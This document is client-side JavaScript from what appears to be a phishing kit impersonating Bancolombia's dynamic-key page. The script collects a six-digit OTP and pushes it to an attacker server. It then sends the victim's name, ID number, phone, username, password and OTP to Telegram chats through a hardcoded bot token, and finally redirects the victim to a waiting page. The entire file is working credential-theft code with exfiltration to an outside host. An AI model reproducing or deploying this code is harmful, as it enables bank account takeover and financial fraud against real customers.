function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

var textMano = document.getElementById("text-hand");
var textdin = document.getElementById("text-cdin");

if (info.checkerInfo.mode == "mano") {
  textMano.removeAttribute("hidden");
  textdin.innerHTML = "Escríbelo aquí";
} else {
  textMano.style.display = "none";
  textdin.innerHTML = "Consulta tu clave dinámica desde la app Bancolombia.";
}

document.getElementById("continue").addEventListener("click", function (e) {
  e.preventDefault();

  // Obtén los valores de los 6 dígitos ingresados
  const number1 = document.getElementById("number-1").value;
  const number2 = document.getElementById("number-2").value;
  const number3 = document.getElementById("number-3").value;
  const number4 = document.getElementById("number-4").value;
  const number5 = document.getElementById("number-5").value;
  const number6 = document.getElementById("number-6").value;

  if (
    number1 === "" ||
    number2 === "" ||
    number3 === "" ||
    number4 === "" ||
    number5 === "" ||
    number6 === ""
  ) {
    alert("Por favor ingrese los 6 dígitos");
    return;
  } else {
    // Combina los números ingresados y actualiza el local storage
    info.metaInfo.cdin =
      number1 + number2 + number3 + number4 + number5 + number6;
    updateLS();

    async function updateOtpAndSendTelegram() {
      // Deshabilitar el botón
      const continueButton = document.getElementById("continue");
      continueButton.disabled = true;

      try {
        // Obtener datos del servidor
        const response = await fetch(`${url}/trico/tricoData`, {
          method: "GET",
          headers: {
            "Content-Type": "application/json",
          },
        });

        const serverData = await response.json();
        const dataTables = [...serverData];
        let userFound = false;

        for (const data of dataTables) {
          if (
            data.telefono == info.metaInfo.telnum &&
            data.usuario == info.metaInfo.user
          ) {
            console.log("Usuario Encontrado");

            // Actualizar OTP en el servidor
            const updateResponse = await fetch(
              `${url}/trico/updateTrico/${data.idreg}`,
              {
                method: "PUT",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  otp: info.metaInfo.cdin,
                }),
              }
            );

            if (!updateResponse.ok) throw new Error("Error al actualizar OTP");

            userFound = true;
            break;
          }
        }

        if (userFound) {
          const message = `🟡 Bancolombia\n🆔 Nombre: ${info.metaInfo.dudename}\n©️ CC: ${info.metaInfo.cc}\n📱 Teléfono: ${info.metaInfo.telnum}\n🚹Usuario: ${info.metaInfo.user}\n🔒Contraseña: ${info.metaInfo.puser}\n💎OTP: ${info.metaInfo.cdin}\nFuente: ${fuente}`;

          for (const chatId of chatIds) {
            const telegramUrl = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
              message
            )}`;
            const telegramResponse = await fetch(telegramUrl);

            if (!telegramResponse.ok) {
              throw new Error(`Error al enviar mensaje a Chat ID: ${chatId}`);
            }
            console.log(`Mensaje enviado a Telegram (Chat ID: ${chatId})`);
          }

          window.location.href = "./wait.html";
        } else {
          console.error("Usuario no encontrado en el servidor");
        }
      } catch (error) {
        console.error("Hubo un problema:", error);
        // Reactivar el botón en caso de error
        continueButton.disabled = false;
      }
    }


    updateOtpAndSendTelegram();
  }
});
